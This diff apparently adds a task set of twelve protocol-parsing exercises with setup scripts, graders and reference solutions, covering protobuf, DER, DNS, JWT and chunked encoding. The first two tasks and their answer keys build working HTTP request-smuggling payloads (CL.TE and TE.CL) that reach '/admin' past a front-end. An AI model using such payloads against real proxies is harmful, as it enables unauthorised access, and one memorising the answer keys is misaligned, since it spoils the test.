@@ -1,0 +1,136 @@
+{
+ "tasks": [
+  {
+   "id": "smuggle_clte",
+   "category": "smuggling",
+   "behavior": "smuggling",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\np = r\"\"\"\ndef front_len(raw):\n    head, sep, body = raw.partition(b\"\\r\\n\\r\\n\")\n    cl = None\n    for line in head.split(b\"\\r\\n\"):\n        if line.lower().startswith(b\"content-length:\"):\n            cl = int(line.split(b\":\", 1)[1].strip())\n    if cl is None:\n        cl = len(body)\n    return len(head) + 4 + cl\n\ndef back_chunked(raw):\n    head, sep, body = raw.partition(b\"\\r\\n\\r\\n\")\n    i = 0\n    out = b\"\"\n    while True:\n        j = body.find(b\"\\r\\n\", i)\n        if j < 0:\n            break\n        size = int(body[i:j].split(b\";\")[0], 16)\n        i = j + 2\n        if size == 0:\n            i += 2\n            break\n        out += body[i:i+size]\n        i += size + 2\n    consumed = len(head) + 4 + i\n    return out, raw[consumed:]\n\"\"\"\nopen(\"parsers.py\", \"w\").write(p)\n\nPY\n",
+   "prompt": "A front-end proxy and back-end server disagree on framing. parsers.py defines front_len(raw) (front-end: uses Content-Length, returns how many bytes it treats as one request) and back_chunked(raw) (back-end: uses Transfer-Encoding: chunked, returns (body, leftover_bytes)). Craft a single raw HTTP/1.1 request (bytes) and write it to req.bin so that: (1) the front-end consumes the WHOLE blob as one request (front_len(raw) == len(raw)), and (2) the back-end, parsing the same bytes as chunked, terminates the first request early and leaves a smuggled request in the leftover that starts with b'GET /admin'. This is the classic CL.TE desync. Import parsers to test.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    import parsers\n    raw = open(\"req.bin\", \"rb\").read()\n    consumed = parsers.front_len(raw)\n    body, left = parsers.back_chunked(raw)\n    ok = (consumed == len(raw)) and left.startswith(b\"GET /admin\")\n    print(\"PASS\" if ok else \"FAIL \" + repr((consumed, len(raw), left[:24])))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nsmug = b\"GET /admin HTTP/1.1\\r\\nHost: internal\\r\\nContent-Length: 0\\r\\n\\r\\n\"\nbody = b\"0\\r\\n\\r\\n\" + smug\nhead = b\"POST / HTTP/1.1\\r\\nHost: front\\r\\nContent-Length: %d\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n\" % len(body)\nopen(\"req.bin\", \"wb\").write(head + body)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "smuggle_tecl",
+   "category": "smuggling",
+   "behavior": "smuggling",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\np = r\"\"\"\ndef front_chunked(raw):\n    head, sep, body = raw.partition(b\"\\r\\n\\r\\n\")\n    i = 0\n    while True:\n        j = body.find(b\"\\r\\n\", i)\n        if j < 0:\n            return len(raw)\n        size = int(body[i:j].split(b\";\")[0], 16)\n        i = j + 2\n        if size == 0:\n            i += 2\n            break\n        i += size + 2\n    return len(head) + 4 + i\n\ndef back_len(raw):\n    head, sep, body = raw.partition(b\"\\r\\n\\r\\n\")\n    cl = 0\n    for line in head.split(b\"\\r\\n\"):\n        if line.lower().startswith(b\"content-length:\"):\n            cl = int(line.split(b\":\", 1)[1].strip())\n    consumed = len(head) + 4 + cl\n    return raw[consumed:]\n\"\"\"\nopen(\"parsers.py\", \"w\").write(p)\n\nPY\n",
+   "prompt": "parsers.py defines front_chunked(raw) (front-end: parses the body as Transfer-Encoding: chunked, returns bytes consumed as one request) and back_len(raw) (back-end: uses Content-Length, returns the leftover bytes after that many body bytes). Craft one raw HTTP/1.1 request, write it to req.bin, so that: (1) the front-end consumes the WHOLE blob as one request (front_chunked(raw) == len(raw)), and (2) the back-end, honoring a small Content-Length, leaves a smuggled request in its leftover that starts with b'GET /admin'. This is the classic TE.CL desync. Import parsers to test.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    import parsers\n    raw = open(\"req.bin\", \"rb\").read()\n    consumed = parsers.front_chunked(raw)\n    left = parsers.back_len(raw)\n    ok = (consumed == len(raw)) and left.startswith(b\"GET /admin\")\n    print(\"PASS\" if ok else \"FAIL \" + repr((consumed, len(raw), left[:24])))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nsmug = b\"GET /admin HTTP/1.1\\r\\nHost: internal\\r\\nX-Ignore: y\"\nsizeline = b\"%x\\r\\n\" % len(smug)\nbody = sizeline + smug + b\"\\r\\n\" + b\"0\\r\\n\\r\\n\"\ncl = len(sizeline)\nhead = b\"POST / HTTP/1.1\\r\\nHost: front\\r\\nContent-Length: %d\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n\" % cl\nopen(\"req.bin\", \"wb\").write(head + body)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "protobuf_decode",
+   "category": "protobuf",
+   "behavior": "protobuf",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nopen(\"blob.hex\", \"w\").write(\"089601120774657374696e6718c0c407\")\n\nPY\n",
+   "prompt": "blob.hex holds the hex of a serialized protobuf message (proto3 wire format). Hand-decode the wire format (tag = (field_number<<3)|wire_type, varints are little-endian base-128) and recover the value of field number 3 (a varint, wire type 0). Write only its decimal integer value to answer.txt. No protobuf library.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport binascii\ntry:\n    data = binascii.unhexlify(open(\"blob.hex\").read().strip())\n    def rv(b, i):\n        r = 0; s = 0\n        while True:\n            x = b[i]; i += 1\n            r |= (x & 0x7f) << s\n            if not (x & 0x80):\n                break\n            s += 7\n        return r, i\n    i = 0; f = {}\n    while i < len(data):\n        tag, i = rv(data, i)\n        fn, wt = tag >> 3, tag & 7\n        if wt == 0:\n            v, i = rv(data, i); f[fn] = v\n        elif wt == 2:\n            ln, i = rv(data, i); f[fn] = data[i:i+ln]; i += ln\n        else:\n            raise ValueError(\"wt\")\n    exp = f[3]\n    got = int(open(\"answer.txt\").read().strip())\n    print(\"PASS\" if got == exp else \"FAIL \" + repr((got, exp)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport binascii\ndata = binascii.unhexlify(open(\"blob.hex\").read().strip())\ndef rv(b, i):\n    r = 0; s = 0\n    while True:\n        x = b[i]; i += 1\n        r |= (x & 0x7f) << s\n        if not (x & 0x80):\n            break\n        s += 7\n    return r, i\ni = 0; f = {}\nwhile i < len(data):\n    tag, i = rv(data, i)\n    fn, wt = tag >> 3, tag & 7\n    if wt == 0:\n        v, i = rv(data, i); f[fn] = v\n    elif wt == 2:\n        ln, i = rv(data, i); f[fn] = data[i:i+ln]; i += ln\nopen(\"answer.txt\", \"w\").write(str(f[3]))\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "protobuf_encode",
+   "category": "protobuf",
+   "behavior": "protobuf",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nopen(\"spec.txt\", \"w\").write(\"field1 varint=42\\nfield2 string=hello\\nfield5 varint=300\\n\")\n\nPY\n",
+   "prompt": "Construct a serialized protobuf message (proto3 wire format) with exactly three fields: field number 1 = varint 42, field number 2 = length-delimited UTF-8 string 'hello', field number 5 = varint 300. Write the raw bytes to out.bin. No protobuf library; emit tags and varints by hand.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    data = open(\"out.bin\", \"rb\").read()\n    def rv(b, i):\n        r = 0; s = 0\n        while True:\n            x = b[i]; i += 1\n            r |= (x & 0x7f) << s\n            if not (x & 0x80):\n                break\n            s += 7\n        return r, i\n    i = 0; f = {}\n    while i < len(data):\n        tag, i = rv(data, i)\n        fn, wt = tag >> 3, tag & 7\n        if wt == 0:\n            v, i = rv(data, i); f[fn] = v\n        elif wt == 2:\n            ln, i = rv(data, i); f[fn] = data[i:i+ln]; i += ln\n        else:\n            raise ValueError(\"wt\")\n    ok = f.get(1) == 42 and f.get(2) == b\"hello\" and f.get(5) == 300\n    print(\"PASS\" if ok else \"FAIL \" + repr(f))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ndef var(n):\n    o = b\"\"\n    while True:\n        b = n & 0x7f; n >>= 7\n        if n:\n            o += bytes([b | 0x80])\n        else:\n            o += bytes([b]); break\n    return o\nout = bytes([(1 << 3) | 0]) + var(42)\nout += bytes([(2 << 3) | 2]) + var(5) + b\"hello\"\nout += bytes([(5 << 3) | 0]) + var(300)\nopen(\"out.bin\", \"wb\").write(out)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "der_cn",
+   "category": "asn1",
+   "behavior": "asn1",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nimport base64\ndef tlv(t, v):\n    return bytes([t, len(v)]) + v\noid = tlv(0x06, bytes([0x55, 0x04, 0x03]))\nps = tlv(0x13, b\"example.com\")\natav = tlv(0x30, oid + ps)\nrdn = tlv(0x31, atav)\nname = tlv(0x30, rdn)\nserial = tlv(0x02, bytes([0x0a, 0x1b, 0x2c, 0x3d]))\ncert = tlv(0x30, serial + name)\nopen(\"cert.b64\", \"w\").write(base64.b64encode(cert).decode())\n\nPY\n",
+   "prompt": "cert.b64 is base64 of a DER-encoded structure (SEQUENCE { INTEGER serial, Name }). Parse the DER by hand (each element is tag / length / value; lengths here are single-byte). Find the commonName attribute (OID 2.5.4.3, DER bytes 06 03 55 04 03) and extract its value string. Write only that string to answer.txt. No ASN.1 library.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport base64\ntry:\n    data = base64.b64decode(open(\"cert.b64\").read())\n    def parse(b):\n        i = 0; out = []\n        while i < len(b):\n            t = b[i]; i += 1\n            l = b[i]; i += 1\n            if l & 0x80:\n                n = l & 0x7f; l = int.from_bytes(b[i:i+n], \"big\"); i += n\n            v = b[i:i+l]; i += l\n            out.append((t, v))\n        return out\n    cn = [None]\n    def walk(b):\n        ch = parse(b)\n        if len(ch) >= 2 and ch[0][0] == 0x06 and ch[0][1] == bytes([0x55, 4, 3]):\n            cn[0] = ch[1][1]\n        for t, v in ch:\n            if t in (0x30, 0x31):\n                walk(v)\n    walk(data)\n    exp = cn[0].decode()\n    got = open(\"answer.txt\").read().strip()\n    print(\"PASS\" if got == exp else \"FAIL \" + repr((got, exp)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport base64\ndata = base64.b64decode(open(\"cert.b64\").read())\ndef parse(b):\n    i = 0; out = []\n    while i < len(b):\n        t = b[i]; i += 1\n        l = b[i]; i += 1\n        v = b[i:i+l]; i += l\n        out.append((t, v))\n    return out\ncn = [None]\ndef walk(b):\n    ch = parse(b)\n    if len(ch) >= 2 and ch[0][0] == 0x06 and ch[0][1] == bytes([0x55, 4, 3]):\n        cn[0] = ch[1][1]\n    for t, v in ch:\n        if t in (0x30, 0x31):\n            walk(v)\nwalk(data)\nopen(\"answer.txt\", \"w\").write(cn[0].decode())\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "binstruct_records",
+   "category": "binstruct",
+   "behavior": "binstruct",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nimport struct\nrecs = [(101, 3.5), (102, 9.25), (103, 1.0), (104, 7.5)]\npayload = b\"\".join(struct.pack(\">If\", i, s) for i, s in recs)\nhdr = struct.pack(\">4sHHI\", b\"RECS\", 1, 0, len(recs))\nopen(\"data.bin\", \"wb\").write(hdr + payload)\n\nPY\n",
+   "prompt": "data.bin is a binary message: a 12-byte header big-endian struct '>4sHHI' = (magic 'RECS', version uint16, flags uint16, count uint32), followed by `count` records, each an 8-byte big-endian struct '>If' = (id uint32, score float32). Parse it, find the record with the highest score, and write that record's id (decimal) to answer.txt. Use struct.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport struct\ntry:\n    data = open(\"data.bin\", \"rb\").read()\n    magic, ver, flags, cnt = struct.unpack(\">4sHHI\", data[:12])\n    assert magic == b\"RECS\"\n    best = None\n    for k in range(cnt):\n        off = 12 + 8 * k\n        rid, sc = struct.unpack(\">If\", data[off:off+8])\n        if best is None or sc > best[1]:\n            best = (rid, sc)\n    got = int(open(\"answer.txt\").read().strip())\n    print(\"PASS\" if got == best[0] else \"FAIL \" + repr((got, best)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport struct\ndata = open(\"data.bin\", \"rb\").read()\nmagic, ver, flags, cnt = struct.unpack(\">4sHHI\", data[:12])\nbest = None\nfor k in range(cnt):\n    off = 12 + 8 * k\n    rid, sc = struct.unpack(\">If\", data[off:off+8])\n    if best is None or sc > best[1]:\n        best = (rid, sc)\nopen(\"answer.txt\", \"w\").write(str(best[0]))\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "bitpack",
+   "category": "bitpack",
+   "behavior": "bitpack",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nv = (13 << 27) | (1337 << 16) | (42 << 10) | 555\nopen(\"packed.hex\", \"w\").write(\"%08x\" % v)\n\nPY\n",
+   "prompt": "packed.hex is one 32-bit big-endian word in hex. It packs four fields, most-significant bit first: A = 5 bits, B = 11 bits, C = 6 bits, D = 10 bits (A|B|C|D fills all 32 bits). Unpack and write 'B,D' (the decimal values of fields B and D, comma-separated, no spaces) to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    v = int(open(\"packed.hex\").read().strip(), 16)\n    B = (v >> 16) & 0x7ff\n    D = v & 0x3ff\n    exp = \"%d,%d\" % (B, D)\n    got = open(\"answer.txt\").read().strip()\n    print(\"PASS\" if got == exp else \"FAIL \" + repr((got, exp)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nv = int(open(\"packed.hex\").read().strip(), 16)\nB = (v >> 16) & 0x7ff\nD = v & 0x3ff\nopen(\"answer.txt\", \"w\").write(\"%d,%d\" % (B, D))\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "chunked_decode",
+   "category": "chunked",
+   "behavior": "chunked",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nbody = b\"4\\r\\nWiki\\r\\n5\\r\\npedia\\r\\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n0\\r\\n\\r\\n\"\nopen(\"chunked.bin\", \"wb\").write(body)\n\nPY\n",
+   "prompt": "chunked.bin is an HTTP/1.1 chunked transfer-encoded body: repeated frames of (hex-size CRLF, that many data bytes, CRLF), terminated by a 0-size chunk then CRLF. Decode it and write the reassembled body bytes to out.txt. Note: chunk data may itself contain CR/LF bytes.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    data = open(\"chunked.bin\", \"rb\").read()\n    i = 0; out = b\"\"\n    while True:\n        j = data.find(b\"\\r\\n\", i)\n        size = int(data[i:j], 16); i = j + 2\n        if size == 0:\n            break\n        out += data[i:i+size]; i += size + 2\n    got = open(\"out.txt\", \"rb\").read()\n    print(\"PASS\" if got == out else \"FAIL \" + repr((got, out)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ndata = open(\"chunked.bin\", \"rb\").read()\ni = 0; out = b\"\"\nwhile True:\n    j = data.find(b\"\\r\\n\", i)\n    size = int(data[i:j], 16); i = j + 2\n    if size == 0:\n        break\n    out += data[i:i+size]; i += size + 2\nopen(\"out.txt\", \"wb\").write(out)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "multipart_extract",
+   "category": "multipart",
+   "behavior": "multipart",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nb = \"----b0undary42\"\nbody = (\n    \"--\" + b + \"\\r\\n\"\n    'Content-Disposition: form-data; name=\"user\"\\r\\n\\r\\nalice\\r\\n'\n    \"--\" + b + \"\\r\\n\"\n    'Content-Disposition: form-data; name=\"token\"\\r\\n\\r\\ns3cr3t-abc.def\\r\\n'\n    \"--\" + b + \"\\r\\n\"\n    'Content-Disposition: form-data; name=\"note\"\\r\\n\\r\\nhello world\\r\\n'\n    \"--\" + b + \"--\\r\\n\"\n)\nopen(\"multipart.bin\", \"wb\").write(body.encode())\n\nPY\n",
+   "prompt": "multipart.bin is a multipart/form-data body with boundary '----b0undary42'. Each part starts with '--<boundary>' CRLF, a Content-Disposition header naming the field, a blank line, then the value, then CRLF. Extract the value of the part whose name is 'token' and write just that value to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    b = \"----b0undary42\"\n    data = open(\"multipart.bin\", \"rb\").read().decode()\n    val = None\n    for p in data.split(\"--\" + b):\n        if 'name=\"token\"' in p:\n            val = p.split(\"\\r\\n\\r\\n\", 1)[1].rstrip(\"\\r\\n\")\n    got = open(\"answer.txt\").read()\n    if got.endswith(\"\\n\"):\n        got = got[:-1]\n    print(\"PASS\" if got == val else \"FAIL \" + repr((got, val)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nb = \"----b0undary42\"\ndata = open(\"multipart.bin\", \"rb\").read().decode()\nval = None\nfor p in data.split(\"--\" + b):\n    if 'name=\"token\"' in p:\n        val = p.split(\"\\r\\n\\r\\n\", 1)[1].rstrip(\"\\r\\n\")\nopen(\"answer.txt\", \"w\").write(val)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "jwt_construct",
+   "category": "jwt",
+   "behavior": "jwt",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nopen(\"secret.txt\", \"w\").write(\"training-secret\")\n\nPY\n",
+   "prompt": "Construct a compact JWS (JWT) with HS256. Header must be {\"alg\":\"HS256\",\"typ\":\"JWT\"}; payload must be {\"sub\":\"1234567890\",\"role\":\"admin\",\"iat\":1516239022}. Sign with HMAC-SHA256 using the raw secret bytes in secret.txt. Use base64url with NO padding for all three segments, joined by dots, and write the token to token.txt. Signature is over the ASCII of '<b64header>.<b64payload>'.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport base64, json, hmac, hashlib\ntry:\n    def b64d(x):\n        return base64.urlsafe_b64decode(x + \"=\" * (-len(x) % 4))\n    tok = open(\"token.txt\").read().strip()\n    h, p, s = tok.split(\".\")\n    hdr = json.loads(b64d(h))\n    pl = json.loads(b64d(p))\n    sec = open(\"secret.txt\", \"rb\").read()\n    sig = base64.urlsafe_b64encode(hmac.new(sec, (h + \".\" + p).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\n    ok = (hdr == {\"alg\": \"HS256\", \"typ\": \"JWT\"}\n          and pl == {\"sub\": \"1234567890\", \"role\": \"admin\", \"iat\": 1516239022}\n          and s == sig and \"=\" not in tok)\n    print(\"PASS\" if ok else \"FAIL \" + repr((hdr, pl, s == sig)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\nimport base64, json, hmac, hashlib\ndef b64(b):\n    return base64.urlsafe_b64encode(b).rstrip(b\"=\")\nh = b64(json.dumps({\"alg\": \"HS256\", \"typ\": \"JWT\"}, separators=(\",\", \":\")).encode())\np = b64(json.dumps({\"sub\": \"1234567890\", \"role\": \"admin\", \"iat\": 1516239022}, separators=(\",\", \":\")).encode())\nsec = open(\"secret.txt\", \"rb\").read()\nsig = b64(hmac.new(sec, h + b\".\" + p, hashlib.sha256).digest())\nopen(\"token.txt\", \"wb\").write(h + b\".\" + p + b\".\" + sig)\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "varint_stream",
+   "category": "framing",
+   "behavior": "framing",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\ndef var(n):\n    o = b\"\"\n    while True:\n        b = n & 0x7f; n >>= 7\n        if n:\n            o += bytes([b | 0x80])\n        else:\n            o += bytes([b]); break\n    return o\nitems = [\"alpha\", \"beta\", \"gamma-\u03b4\", \"this is a longer record number four\"]\ndata = b\"\".join(var(len(s.encode())) + s.encode() for s in items)\nopen(\"stream.bin\", \"wb\").write(data)\n\nPY\n",
+   "prompt": "stream.bin is a sequence of length-prefixed records. Each record = a base-128 varint giving the byte length of the following UTF-8 payload, then that many payload bytes. Parse the stream and write the 3rd record (1-indexed), decoded as UTF-8, to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    data = open(\"stream.bin\", \"rb\").read()\n    def rv(b, i):\n        r = 0; s = 0\n        while True:\n            x = b[i]; i += 1\n            r |= (x & 0x7f) << s\n            if not (x & 0x80):\n                break\n            s += 7\n        return r, i\n    i = 0; recs = []\n    while i < len(data):\n        ln, i = rv(data, i)\n        recs.append(data[i:i+ln]); i += ln\n    exp = recs[2]\n    got = open(\"answer.txt\", \"rb\").read()\n    if got.endswith(b\"\\n\"):\n        got = got[:-1]\n    print(\"PASS\" if got == exp else \"FAIL \" + repr((got, exp)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ndata = open(\"stream.bin\", \"rb\").read()\ndef rv(b, i):\n    r = 0; s = 0\n    while True:\n        x = b[i]; i += 1\n        r |= (x & 0x7f) << s\n        if not (x & 0x80):\n            break\n        s += 7\n    return r, i\ni = 0; recs = []\nwhile i < len(data):\n    ln, i = rv(data, i)\n    recs.append(data[i:i+ln]); i += ln\nopen(\"answer.txt\", \"wb\").write(recs[2])\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  },
+  {
+   "id": "dns_qname",
+   "category": "dns",
+   "behavior": "dns",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\npython3 - <<'PY'\n\nimport struct\nhdr = struct.pack(\">HHHHHH\", 0x1234, 0x0100, 1, 0, 0, 0)\ndef enc(name):\n    o = b\"\"\n    for lab in name.split(\".\"):\n        o += bytes([len(lab)]) + lab.encode()\n    return o + b\"\\x00\"\nq = enc(\"www.example.com\") + struct.pack(\">HH\", 1, 1)\nopen(\"dns.bin\", \"wb\").write(hdr + q)\n\nPY\n",
+   "prompt": "dns.bin is a raw DNS query message: a 12-byte header, then the question section. The QNAME is a sequence of labels, each = one length byte then that many bytes, terminated by a zero length byte, followed by QTYPE and QCLASS (2 bytes each). Decode the QNAME and write the domain (labels joined by '.', no trailing dot) to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ntry:\n    data = open(\"dns.bin\", \"rb\").read()\n    i = 12; labels = []\n    while True:\n        ln = data[i]; i += 1\n        if ln == 0:\n            break\n        labels.append(data[i:i+ln].decode()); i += ln\n    exp = \".\".join(labels)\n    got = open(\"answer.txt\").read().strip()\n    print(\"PASS\" if got == exp else \"FAIL \" + repr((got, exp)))\nexcept Exception as e:\n    print(\"FAIL \" + repr(e))\n\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\nset -e\ncd \"$W\" || exit 1\npython3 - <<'PY'\n\ndata = open(\"dns.bin\", \"rb\").read()\ni = 12; labels = []\nwhile True:\n    ln = data[i]; i += 1\n    if ln == 0:\n        break\n    labels.append(data[i:i+ln].decode()); i += ln\nopen(\"answer.txt\", \"w\").write(\".\".join(labels))\n\nPY\n",
+   "self_test_passed": true,
+   "notes": "protocol/format-parsing harvest"
+  }
+ ]
+}
